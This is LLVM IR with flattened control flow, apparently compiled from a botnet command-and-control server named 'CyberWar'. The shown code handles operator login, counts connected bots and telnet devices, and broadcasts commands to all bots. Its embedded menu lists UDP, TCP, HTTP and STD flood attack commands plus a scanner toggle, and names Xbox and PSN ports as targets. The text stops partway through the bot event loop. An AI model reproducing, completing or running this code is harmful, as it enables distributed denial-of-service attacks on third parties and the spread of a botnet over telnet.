; ModuleID = 'host/ir_fla/CyberWar.ll'
source_filename = "server.c"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.clientdata_t = type { i32, i8 }
%struct.telnetdata_t = type { i32 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }
%struct.login_info = type { [20 x i8], [20 x i8] }
%struct.tm = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i64, i8* }
%struct.epoll_event = type <{ i32, %union.epoll_data }>
%union.epoll_data = type { i8* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%union.pthread_attr_t = type { i64, [48 x i8] }
%struct.addrinfo = type { i32, i32, i32, i32, i32, %struct.sockaddr*, i8*, %struct.addrinfo* }

@.str = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@clients = common global [1000000 x %struct.clientdata_t] zeroinitializer, align 16
@managements = common global [1000000 x %struct.telnetdata_t] zeroinitializer, align 16
@.str.1 = private unnamed_addr constant [6 x i8] c"\1B[31m\00", align 1
@.str.2 = private unnamed_addr constant [3 x i8] c": \00", align 1
@.str.3 = private unnamed_addr constant [16 x i8] c"sent to fd: %d\0A\00", align 1
@.str.4 = private unnamed_addr constant [16 x i8] c"\0D\0A\1B[32mLinux~: \00", align 1
@.str.5 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@epollFD = internal global i32 0, align 4
@listenFD = internal global i32 0, align 4
@.str.6 = private unnamed_addr constant [7 x i8] c"accept\00", align 1
@.str.7 = private unnamed_addr constant [14 x i8] c"!* LOLNOGTFO\0A\00", align 1
@.str.8 = private unnamed_addr constant [10 x i8] c"epoll_ctl\00", align 1
@.str.9 = private unnamed_addr constant [15 x i8] c"!* SCANNER ON\0A\00", align 1
@.str.10 = private unnamed_addr constant [6 x i8] c"PONG\0A\00", align 1
@.str.11 = private unnamed_addr constant [8 x i8] c"REPORT \00", align 1
@telFD = internal global %struct._IO_FILE* null, align 8
@.str.12 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1
@TELFound = internal global i32 0, align 4
@.str.13 = private unnamed_addr constant [8 x i8] c"PROBING\00", align 1
@scannerreport = internal global i32 0, align 4
@.str.14 = private unnamed_addr constant [15 x i8] c"REMOVING PROBE\00", align 1
@.str.15 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.16 = private unnamed_addr constant [11 x i8] c"buf: \22%s\22\0A\00", align 1
@.str.17 = private unnamed_addr constant [47 x i8] c"%c]0;Bots Connected: %d | User(s) Online: %d%c\00", align 1
@OperatorsConnected = internal global i32 0, align 4
@.str.18 = private unnamed_addr constant [10 x i8] c"login.txt\00", align 1
@.str.19 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.20 = private unnamed_addr constant [6 x i8] c"%s %s\00", align 1
@accounts = internal global [22 x %struct.login_info] zeroinitializer, align 16
@.str.21 = private unnamed_addr constant [22 x i8] c"\1B[37mLogin ID: \1B[30m \00", align 1
@.str.22 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.23 = private unnamed_addr constant [22 x i8] c"\1B[37mPasscode: \1B[30m \00", align 1
@.str.24 = private unnamed_addr constant [5 x i8] c"\1B[1A\00", align 1
@.str.25 = private unnamed_addr constant [48 x i8] c"\1B[31mIP Logged, Disconnecting From Session...\0D\0A\00", align 1
@.str.26 = private unnamed_addr constant [92 x i8] c"\1B[32m  ######  ##    ## ########  ######## ########  \1B[31m##      ##    ###    ########  \0D\0A\00", align 1
@.str.27 = private unnamed_addr constant [92 x i8] c"\1B[32m ##    ##  ##  ##  ##     ## ##       ##     ## \1B[31m##  ##  ##   ## ##   ##     ## \0D\0A\00", align 1
@.str.28 = private unnamed_addr constant [92 x i8] c"\1B[32m ##         ####   ##     ## ##       ##     ## \1B[31m##  ##  ##  ##   ##  ##     ## \0D\0A\00", align 1
@.str.29 = private unnamed_addr constant [92 x i8] c"\1B[32m ##          ##    ########  ######   ########  \1B[31m##  ##  ## ##     ## ########  \0D\0A\00", align 1
@.str.30 = private unnamed_addr constant [92 x i8] c"\1B[32m ##          ##    ##     ## ##       ##   ##   \1B[31m##  ##  ## ######### ##   ##   \0D\0A\00", align 1
@.str.31 = private unnamed_addr constant [92 x i8] c"\1B[32m ##    ##    ##    ##     ## ##       ##    ##  \1B[31m##  ##  ## ##     ## ##    ##  \0D\0A\00", align 1
@.str.32 = private unnamed_addr constant [158 x i8] c"\1B[32m  ######     ##    ########  ######## ##     ##  \1B[31m###  ###  ##     ## ##     ##                                                                   \0D\0A\00", align 1
@.str.33 = private unnamed_addr constant [82 x i8] c"\1B[31m     _____________________________________________________________________\0D\0A\00", align 1
@.str.34 = private unnamed_addr constant [9 x i8] c"\1B[30m \0D\0A\00", align 1
@.str.35 = private unnamed_addr constant [74 x i8] c"                              \1B[37m \1B[37m[ \1B[32mYour ID: \1B[31m%s\1B[37m ]\0D\0A\00", align 1
@.str.36 = private unnamed_addr constant [84 x i8] c"                          \1B[37m \1B[37m[ \1B[32mOpen Main Menu With: \1B[31mMenu\1B[37m ]\0D\0A\00", align 1
@.str.37 = private unnamed_addr constant [13 x i8] c"\1B[37mLinux~:\00", align 1
@.str.38 = private unnamed_addr constant [5 x i8] c"Bots\00", align 1
@.str.39 = private unnamed_addr constant [68 x i8] c"Bots Connected: [\1B[32m %d \1B[37m] | Users Online: [\1B[32m %d \1B[37m]\0D\0A\00", align 1
@.str.40 = private unnamed_addr constant [5 x i8] c"Stat\00", align 1
@.str.41 = private unnamed_addr constant [62 x i8] c"Telnet Devices: [\1B[32m %d \1B[37m] | Status: [\1B[32m %d \1B[37m]\0D\0A\00", align 1
@.str.42 = private unnamed_addr constant [5 x i8] c"Menu\00", align 1
@.str.43 = private unnamed_addr constant [54 x i8] c"\0D\0A\1B[37m[ \1B[32mYou Have Opened The Menu, %s \1B[37m]\0D\0A\0D\0A\00", align 1
@.str.44 = private unnamed_addr constant [68 x i8] c"\1B[32m#   \1B[32m UDP Attack: \1B[32m!* UDP [IP] [Port] [Time] 32 0 10\0D\0A\00", align 1
@.str.45 = private unnamed_addr constant [72 x i8] c"\1B[32m#   \1B[32m TCP Attack: \1B[32m!* TCP [IP] [Port] [Time] 32 all 0 10\0D\0A\00", align 1
@.str.46 = private unnamed_addr constant [56 x i8] c"\1B[32m#   \1B[32m HTTP Attack: \1B[32m!* HTTP [Url] [Time]\0D\0A\00", align 1
@.str.47 = private unnamed_addr constant [60 x i8] c"\1B[32m#   \1B[32m STD Attack: \1B[32m!* STD [IP] [Port] [Time]\0D\0A\00", align 1
@.str.48 = private unnamed_addr constant [12 x i8] c"   \1B[30m \0D\0A\00", align 1
@.str.49 = private unnamed_addr constant [76 x i8] c"   \1B[32m  ---------------------------------------------------------------\0D\0A\00", align 1
@.str.50 = private unnamed_addr constant [57 x i8] c"\1B[32m#   \1B[32m Main Menu:     \1B[31m[ \1B[32mMenu  \1B[31m]\0D\0A\00", align 1
@.str.51 = private unnamed_addr constant [57 x i8] c"\1B[32m#   \1B[32m Bot Count:     \1B[31m[ \1B[32mBots  \1B[31m]\0D\0A\00", align 1
@.str.52 = private unnamed_addr constant [57 x i8] c"\1B[32m#   \1B[32m Telnet Status: \1B[31m[ \1B[32mStat  \1B[31m]\0D\0A\00", align 1
@.str.53 = private unnamed_addr constant [57 x i8] c"\1B[32m#   \1B[32m Logout:        \1B[31m[ \1B[32mLog   \1B[31m]\0D\0A\00", align 1
@.str.54 = private unnamed_addr constant [57 x i8] c"\1B[32m#   \1B[32m Kill Attack:   \1B[31m[ \1B[32mKill  \1B[31m]\0D\0A\00", align 1
@.str.55 = private unnamed_addr constant [57 x i8] c"\1B[32m#   \1B[32m Clear Screen:  \1B[31m[ \1B[32mClear \1B[31m]\0D\0A\00", align 1
@.str.56 = private unnamed_addr constant [57 x i8] c"\1B[32m#   \1B[32m Credits:       \1B[31m[ \1B[32mCreds \1B[31m]\0D\0A\00", align 1
@.str.57 = private unnamed_addr constant [7 x i8] c"Hidden\00", align 1
@.str.58 = private unnamed_addr constant [50 x i8] c"   \0D\0A\1B[32m[\1B[32m You Must Be A 1337 ;) \1B[32m]\0D\0A\0D\0A\00", align 1
@.str.59 = private unnamed_addr constant [56 x i8] c"   \1B[32m UDP - \1B[32m!* UDP [IP] [Port] [Time] 32 0 10\0D\0A\00", align 1
@.str.60 = private unnamed_addr constant [60 x i8] c"   \1B[32m TCP - \1B[32m!* TCP [IP] [Port] [Time] 32 all 0 10\0D\0A\00", align 1
@.str.61 = private unnamed_addr constant [44 x i8] c"   \1B[32m HTTP - \1B[32m!* HTTP [Url] [Time]\0D\0A\00", align 1
@.str.62 = private unnamed_addr constant [48 x i8] c"   \1B[32m STD - \1B[32m!* STD [IP] [PORT] [TIME]\0D\0A\00", align 1
@.str.63 = private unnamed_addr constant [5 x i8] c"Kill\00", align 1
@.str.64 = private unnamed_addr constant [19 x i8] c"\1B[32m!* KILLATTK\0D\0A\00", align 1
@.str.65 = private unnamed_addr constant [6 x i8] c"Clear\00", align 1
@.str.66 = private unnamed_addr constant [11 x i8] c"\1B[2J\1B[1;1H\00", align 1
@.str.67 = private unnamed_addr constant [6 x i8] c"Creds\00", align 1
@.str.68 = private unnamed_addr constant [57 x i8] c"\0D\0A\1B[34mCredits-> \1B[32mMade By Vendettxs On Instagram\0D\0A\0D\0A\00", align 1
@.str.69 = private unnamed_addr constant [6 x i8] c"Ports\00", align 1
@.str.70 = private unnamed_addr constant [98 x i8] c"\0D\0A\1B[37mPORTS: \1B[31mXBOX Services: 3074 | PSN Services: 443 | DEFAULT: 80 | DNS/Nameserver: 53\0D\0A\0D\0A\00", align 1
@.str.71 = private unnamed_addr constant [4 x i8] c"Log\00", align 1
@.str.72 = private unnamed_addr constant [40 x i8] c"Terminating Session. Logging Out ID: %s\00", align 1
@.str.73 = private unnamed_addr constant [10 x i8] c"%s: \22%s\22\0A\00", align 1
@.str.74 = private unnamed_addr constant [11 x i8] c"server.log\00", align 1
@.str.75 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.76 = private unnamed_addr constant [9 x i8] c"%I:%M %p\00", align 1
@.str.77 = private unnamed_addr constant [13 x i8] c"[%s] %s: %s\0A\00", align 1
@.str.78 = private unnamed_addr constant [21 x i8] c"ERROR opening socket\00", align 1
@.str.79 = private unnamed_addr constant [17 x i8] c"ERROR on binding\00", align 1
@.str.80 = private unnamed_addr constant [16 x i8] c"ERROR on accept\00", align 1
@stderr = external global %struct._IO_FILE*, align 8
@.str.81 = private unnamed_addr constant [39 x i8] c"Usage: %s [port] [threads] [cnc-port]\0A\00", align 1
@.str.82 = private unnamed_addr constant [11 x i8] c"telnet.txt\00", align 1
@.str.83 = private unnamed_addr constant [3 x i8] c"a+\00", align 1
@.str.84 = private unnamed_addr constant [7 x i8] c"listen\00", align 1
@.str.85 = private unnamed_addr constant [13 x i8] c"epoll_create\00", align 1
@.str.86 = private unnamed_addr constant [4 x i8] c"FBI\00", align 1
@.str.87 = private unnamed_addr constant [6 x i8] c"fcntl\00", align 1
@.str.88 = private unnamed_addr constant [17 x i8] c"getaddrinfo: %s\0A\00", align 1
@.str.89 = private unnamed_addr constant [11 x i8] c"setsockopt\00", align 1
@.str.90 = private unnamed_addr constant [16 x i8] c"Could not bind\0A\00", align 1

; Function Attrs: noinline nounwind uwtable
define i32 @fdgets(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 1, i32* %8, align 4
  %switchVar = alloca i32
  store i32 -76433023, i32* %switchVar
  %.reg2mem = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -76433023, label %9
    i32 -352887650, label %13
    i32 -1983795222, label %18
    i32 933120852, label %27
    i32 -1523817708, label %29
    i32 792328849, label %39
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:9:                                      ; preds = %loopEntry
  %10 = load i32, i32* %8, align 4
  %11 = icmp eq i32 %10, 1
  %12 = select i1 %11, i32 -352887650, i32 933120852
  store i32 %12, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %14 = load i32, i32* %7, align 4
  %15 = load i32, i32* %5, align 4
  %16 = icmp slt i32 %14, %15
  %17 = select i1 %16, i32 -1983795222, i32 933120852
  store i32 %17, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %4, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  %23 = getelementptr inbounds i8, i8* %22, i64 -1
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp ne i32 %25, 10
  store i32 933120852, i32* %switchVar
  store i1 %26, i1* %.reg2mem
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  %28 = select i1 %.reload, i32 -1523817708, i32 792328849
  store i32 %28, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load i32, i32* %6, align 4
  %31 = load i8*, i8** %4, align 8
  %32 = load i32, i32* %7, align 4
  %33 = sext i32 %32 to i64
  %34 = getelementptr inbounds i8, i8* %31, i64 %33
  %35 = call i64 @read(i32 %30, i8* %34, i64 1)
  %36 = trunc i64 %35 to i32
  store i32 %36, i32* %8, align 4
  %37 = load i32, i32* %7, align 4
  %38 = add nsw i32 %37, 1
  store i32 %38, i32* %7, align 4
  store i32 -76433023, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i32, i32* %8, align 4
  ret i32 %40

loopEnd:                                          ; preds = %29, %27, %18, %13, %9, %switchDefault
  br label %loopEntry
}

declare i64 @read(i32, i8*, i64) #1

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #8
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  %switchVar = alloca i32
  store i32 -1818085224, i32* %switchVar
  %.reg2mem = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1818085224, label %10
    i32 -1211695376, label %20
    i32 -1143057798, label %23
    i32 1157694373, label %24
    i32 -575450648, label %29
    i32 1606964583, label %38
    i32 -1423649291, label %40
    i32 -1260489182, label %43
    i32 175848412, label %45
    i32 930145164, label %50
    i32 27702615, label %62
    i32 -1135499806, label %65
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i32
  %17 = call i32 @isspace(i32 %16) #8
  %18 = icmp ne i32 %17, 0
  %19 = select i1 %18, i32 -1211695376, i32 -1143057798
  store i32 %19, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load i32, i32* %4, align 4
  %22 = add nsw i32 %21, 1
  store i32 %22, i32* %4, align 4
  store i32 -1818085224, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  store i32 1157694373, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i32, i32* %5, align 4
  %26 = load i32, i32* %4, align 4
  %27 = icmp sge i32 %25, %26
  %28 = select i1 %27, i32 -575450648, i32 1606964583
  store i32 %28, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load i8*, i8** %2, align 8
  %31 = load i32, i32* %5, align 4
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds i8, i8* %30, i64 %32
  %34 = load i8, i8* %33, align 1
  %35 = sext i8 %34 to i32
  %36 = call i32 @isspace(i32 %35) #8
  %37 = icmp ne i32 %36, 0
  store i32 1606964583, i32* %switchVar
  store i1 %37, i1* %.reg2mem
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  %39 = select i1 %.reload, i32 -1423649291, i32 -1260489182
  store i32 %39, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i32, i32* %5, align 4
  %42 = add nsw i32 %41, -1
  store i32 %42, i32* %5, align 4
  store i32 1157694373, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  %44 = load i32, i32* %4, align 4
  store i32 %44, i32* %3, align 4
  store i32 175848412, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = load i32, i32* %3, align 4
  %47 = load i32, i32* %5, align 4
  %48 = icmp sle i32 %46, %47
  %49 = select i1 %48, i32 930145164, i32 -1135499806
  store i32 %49, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %2, align 8
  %52 = load i32, i32* %3, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i8, i8* %51, i64 %53
  %55 = load i8, i8* %54, align 1
  %56 = load i8*, i8** %2, align 8
  %57 = load i32, i32* %3, align 4
  %58 = load i32, i32* %4, align 4
  %59 = sub nsw i32 %57, %58
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds i8, i8* %56, i64 %60
  store i8 %55, i8* %61, align 1
  store i32 27702615, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  %63 = load i32, i32* %3, align 4
  %64 = add nsw i32 %63, 1
  store i32 %64, i32* %3, align 4
  store i32 175848412, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = load i8*, i8** %2, align 8
  %67 = load i32, i32* %3, align 4
  %68 = load i32, i32* %4, align 4
  %69 = sub nsw i32 %67, %68
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds i8, i8* %66, i64 %70
  store i8 0, i8* %71, align 1
  ret void

loopEnd:                                          ; preds = %62, %50, %45, %43, %40, %38, %29, %24, %23, %20, %10, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #2

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #2

; Function Attrs: noinline nounwind uwtable
define void @broadcast(i8*, i32, i8*) #0 {
  %.reg2mem = alloca i32
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i64, align 8
  %10 = alloca %struct.tm*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i8* %2, i8** %6, align 8
  store i32 1, i32* %7, align 4
  %13 = load i8*, i8** %4, align 8
  %14 = call i32 @strcmp(i8* %13, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0)) #8
  store i32 %14, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1403015447, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1403015447, label %first
    i32 1768366643, label %17
    i32 870931182, label %18
    i32 1230019670, label %36
    i32 -2014142570, label %40
    i32 1868444056, label %45
    i32 -679032317, label %53
    i32 -693445412, label %57
    i32 2006024190, label %65
    i32 -668495004, label %66
    i32 -645972594, label %70
    i32 -1265325752, label %78
    i32 -510988869, label %88
    i32 2083135157, label %99
    i32 1134697254, label %107
    i32 -509642334, label %110
    i32 -538098009, label %113
    i32 -1631084611, label %114
    i32 -1601132169, label %117
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %15 = icmp eq i32 %.reload, 0
  %16 = select i1 %15, i32 1768366643, i32 870931182
  store i32 %16, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  store i32 0, i32* %7, align 4
  store i32 870931182, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %4, align 8
  %20 = call i64 @strlen(i8* %19) #8
  %21 = add i64 %20, 10
  %22 = call noalias i8* @malloc(i64 %21) #7
  store i8* %22, i8** %8, align 8
  %23 = load i8*, i8** %8, align 8
  %24 = load i8*, i8** %4, align 8
  %25 = call i64 @strlen(i8* %24) #8
  %26 = add i64 %25, 10
  call void @llvm.memset.p0i8.i64(i8* %23, i8 0, i64 %26, i32 1, i1 false)
  %27 = load i8*, i8** %8, align 8
  %28 = load i8*, i8** %4, align 8
  %29 = call i8* @strcpy(i8* %27, i8* %28) #7
  %30 = load i8*, i8** %8, align 8
  call void @trim(i8* %30)
  %31 = call i64 @time(i64* %9) #7
  %32 = call %struct.tm* @localtime(i64* %9) #7
  store %struct.tm* %32, %struct.tm** %10, align 8
  %33 = load %struct.tm*, %struct.tm** %10, align 8
  %34 = call i8* @asctime(%struct.tm* %33) #7
  store i8* %34, i8** %11, align 8
  %35 = load i8*, i8** %11, align 8
  call void @trim(i8* %35)
  store i32 0, i32* %12, align 4
  store i32 1230019670, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i32, i32* %12, align 4
  %38 = icmp slt i32 %37, 1000000
  %39 = select i1 %38, i32 -2014142570, i32 -1601132169
  store i32 %39, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i32, i32* %12, align 4
  %42 = load i32, i32* %5, align 4
  %43 = icmp eq i32 %41, %42
  %44 = select i1 %43, i32 2006024190, i32 1868444056
  store i32 %44, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = load i32, i32* %12, align 4
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %47
  %49 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %48, i32 0, i32 1
  %50 = load i8, i8* %49, align 4
  %51 = icmp ne i8 %50, 0
  %52 = select i1 %51, i32 -668495004, i32 -679032317
  store i32 %52, i32* %switchVar
  br label %loopEnd

; <label>:53:                                     ; preds = %loopEntry
  %54 = load i32, i32* %7, align 4
  %55 = icmp eq i32 %54, 0
  %56 = select i1 %55, i32 2006024190, i32 -693445412
  store i32 %56, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = load i32, i32* %12, align 4
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %59
  %61 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %60, i32 0, i32 0
  %62 = load i32, i32* %61, align 4
  %63 = icmp ne i32 %62, 0
  %64 = select i1 %63, i32 -668495004, i32 2006024190
  store i32 %64, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  store i32 -1631084611, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i32, i32* %7, align 4
  %68 = icmp ne i32 %67, 0
  %69 = select i1 %68, i32 -645972594, i32 -510988869
  store i32 %69, i32* %switchVar
  br label %loopEnd

; <label>:70:                                     ; preds = %loopEntry
  %71 = load i32, i32* %12, align 4
  %72 = sext i32 %71 to i64
  %73 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %72
  %74 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %73, i32 0, i32 0
  %75 = load i32, i32* %74, align 4
  %76 = icmp ne i32 %75, 0
  %77 = select i1 %76, i32 -1265325752, i32 -510988869
  store i32 %77, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = load i32, i32* %12, align 4
  %80 = call i64 @send(i32 %79, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i32 0, i32 0), i64 5, i32 16384)
  %81 = load i32, i32* %12, align 4
  %82 = load i8*, i8** %6, align 8
  %83 = load i8*, i8** %6, align 8
  %84 = call i64 @strlen(i8* %83) #8
  %85 = call i64 @send(i32 %81, i8* %82, i64 %84, i32 16384)
  %86 = load i32, i32* %12, align 4
  %87 = call i64 @send(i32 %86, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i32 0, i32 0), i64 2, i32 16384)
  store i32 -510988869, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  %89 = load i32, i32* %12, align 4
  %90 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.3, i32 0, i32 0), i32 %89)
  %91 = load i32, i32* %12, align 4
  %92 = load i8*, i8** %4, align 8
  %93 = load i8*, i8** %4, align 8
  %94 = call i64 @strlen(i8* %93) #8
  %95 = call i64 @send(i32 %91, i8* %92, i64 %94, i32 16384)
  %96 = load i32, i32* %7, align 4
  %97 = icmp ne i32 %96, 0
  %98 = select i1 %97, i32 2083135157, i32 -509642334
  store i32 %98, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %100 = load i32, i32* %12, align 4
  %101 = sext i32 %100 to i64
  %102 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %101
  %103 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %102, i32 0, i32 0
  %104 = load i32, i32* %103, align 4
  %105 = icmp ne i32 %104, 0
  %106 = select i1 %105, i32 1134697254, i32 -509642334
  store i32 %106, i32* %switchVar
  br label %loopEnd

; <label>:107:                                    ; preds = %loopEntry
  %108 = load i32, i32* %12, align 4
  %109 = call i64 @send(i32 %108, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.4, i32 0, i32 0), i64 13, i32 16384)
  store i32 -538098009, i32* %switchVar
  br label %loopEnd

; <label>:110:                                    ; preds = %loopEntry
  %111 = load i32, i32* %12, align 4
  %112 = call i64 @send(i32 %111, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0), i64 1, i32 16384)
  store i32 -538098009, i32* %switchVar
  br label %loopEnd

; <label>:113:                                    ; preds = %loopEntry
  store i32 -1631084611, i32* %switchVar
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  %115 = load i32, i32* %12, align 4
  %116 = add nsw i32 %115, 1
  store i32 %116, i32* %12, align 4
  store i32 1230019670, i32* %switchVar
  br label %loopEnd

; <label>:117:                                    ; preds = %loopEntry
  %118 = load i8*, i8** %8, align 8
  call void @free(i8* %118) #7
  ret void

loopEnd:                                          ; preds = %114, %113, %110, %107, %99, %88, %78, %70, %66, %65, %57, %53, %45, %40, %36, %18, %17, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #2

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #3

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #4

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #3

; Function Attrs: nounwind
declare i64 @time(i64*) #3

; Function Attrs: nounwind
declare %struct.tm* @localtime(i64*) #3

; Function Attrs: nounwind
declare i8* @asctime(%struct.tm*) #3

declare i64 @send(i32, i8*, i64, i32) #1

declare i32 @printf(i8*, ...) #1

; Function Attrs: nounwind
declare void @free(i8*) #3

; Function Attrs: noinline nounwind uwtable
define i8* @BotEventLoop(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca %struct.epoll_event, align 1
  %5 = alloca %struct.epoll_event*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr, align 2
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca %struct.clientdata_t*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i64, align 8
  %18 = alloca [2048 x i8], align 16
  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  %21 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
